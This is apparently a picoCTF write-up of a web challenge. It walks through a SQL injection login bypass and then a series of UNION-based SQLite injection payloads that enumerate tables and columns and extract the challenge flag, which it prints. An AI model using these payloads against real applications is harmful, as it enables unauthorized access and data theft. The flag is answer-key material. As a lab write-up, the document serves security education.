# More SQLi

## Challenge Info 

Tags: Web Exploitation, SQL

AUTHOR: MUBARAK MIKAIL

Points: 200

## Description

Can you find the flag on this website.
Try to find the flag here.


## Solution 

There is a simple login page which reveals SQL query being used at the backened when wrong credentials are entered. 

<img width="501" alt="image" src="https://user-images.githubusercontent.com/66155978/225986868-2c8b3278-1c07-4cb8-be77-b10b67414c85.png">

We need to bypass the login using SQLi 

username= admin 

password= ' OR 1 -- -

Yayyy!!! We are logged in...

<img width="612" alt="image" src="https://user-images.githubusercontent.com/66155978/225989489-47d67aa9-c42e-4dd7-97bd-ac700613b768.png">


There's a page with details of few cities and a search bar maybe we can try to dump the database using the search bar. Initially, no id parameter or any query is getting exposed by searching random things. 

Let's try with some SQL commands and try to confirm number of columns 

```
-1' UNION SELECT 1,2,3--+
```

<img width="455" alt="image" src="https://user-images.githubusercontent.com/66155978/225989616-5c016507-30de-49eb-bd4d-8ee10c529126.png">

Since its a SQLlite database according to the hint, lets try seeing version of the database. 

```
-1' UNION SELECT sqlite_version(),2,3--+
```

<img width="467" alt="image" src="https://user-images.githubusercontent.com/66155978/225989890-e27726c1-ddf2-42d3-9bfe-dee893304649.png">

Next we need to find table names available. I found a similar payload on [Exploit-DB](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf). 

```
-1' UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--+
```

<img width="441" alt="image" src="https://user-images.githubusercontent.com/66155978/225991201-0b184fbf-b432-4d2e-b2ee-6c5964f9ef3b.png">

Now, time to get column names. The 4th table "more_table" has a column named "flag". 

```
-1' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='more_table'--+
```

<img width="450" alt="image" src="https://user-images.githubusercontent.com/66155978/225992401-7b9718fa-6e0d-48e7-8e80-e4f97217b96f.png">

Now, finally extracting data from column 

```
-1' UNION SELECT 1,flag,3 FROM more_table--+ 
```

<img width="461" alt="image" src="https://user-images.githubusercontent.com/66155978/225993400-38c4c86b-c990-47b6-99ea-2cedea9d8d8b.png">


## Flag 

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}	
